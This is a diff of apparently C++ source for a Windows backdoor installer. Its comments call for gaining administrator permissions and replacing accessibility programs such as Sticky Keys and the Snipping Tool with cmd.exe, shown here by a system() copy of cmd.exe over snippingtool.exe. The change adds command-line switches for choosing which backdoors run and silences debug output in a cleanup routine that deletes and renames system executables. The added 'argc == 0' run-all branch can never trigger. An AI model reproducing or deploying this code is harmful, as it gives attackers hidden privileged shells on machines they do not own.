@@ -60,11 +60,11 @@ void cleanup() {
         original.replace(executable.find("old-"), 4, "");
         //deletes previous backdoors
         std::string delCommand = "del " + original;
-        std::cout << delCommand << std::endl;
+        //std::cout << delCommand << std::endl; testing
         error_handling(system(delCommand.c_str()), delCommand.c_str());
         //restores original executables
         std::string renameCommand = "move \"" + executable + "\" \"" + original + "\"";
-        std::cout << renameCommand << std::endl;
+        //std::cout << renameCommand << std::endl; testing
         error_handling(system(renameCommand.c_str()), renameCommand.c_str());
     }
 }
@@ -115,7 +115,7 @@ void snipping_tool() {
     error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe");
 }
 
-int main(){
+int main(int argc, char *argv[]){
     //grants administrator permissions to all backdoor executables
     std::cout << "Gaining Permissions..." << std::endl;
     priv_esc();
@@ -128,14 +128,46 @@ int main(){
     std::cout << "Cleaning Up..." << std::endl;
     cleanup();
 
-    //executes backdoors
+    //executes selected backdoors
     std::cout << "Executing Backdoors..." << std::endl;
-    sticky_keys();
-    utility_manager();
-    // narrator();
-    // on_screen_keyboard();
-    // magnifier();
-    // display_switch();
-    // snipping_tool();
+    if (argc == 0) {
+        sticky_keys();
+        utility_manager();
+        narrator();
+        on_screen_keyboard();
+        magnifier();
+        display_switch();
+        snipping_tool();
+    }
+    else {
+        for (int i = 1; i < argc; i++) {
+            const std::string arg = argv[i];
+            if (arg == "sk") {
+                sticky_keys();
+                std::cout << "Executed Sticky Keys Backdoor" << std::endl;
+            } else if (arg == "um") {
+                utility_manager();
+                std::cout << "Executed Utility Manager Backdoor" << std::endl;
+            } else if (arg == "n") {
+                narrator();
+                std::cout << "Executed Narrator Backdoor" << std::endl;
+            } else if (arg == "osk") {
+                on_screen_keyboard();
+                std::cout << "Executed On Screen Keyboard Backdoor" << std::endl;
+            } else if (arg == "m") {
+                magnifier();
+                std::cout << "Executed Magnifier Backdoor" << std::endl;
+            } else if (arg == "ds") {
+                display_switch();
+                std::cout << "Executed Display Switch Backdoor" << std::endl;
+            } else if (arg == "st") {
+                snipping_tool();
+                std::cout << "Executed Snipping Tool Backdoor" << std::endl;
+            } else {
+                std::cout << "Invalid Argument: " << arg << std::endl;
+            }
+        }
+    }
+
     return 0;
 }
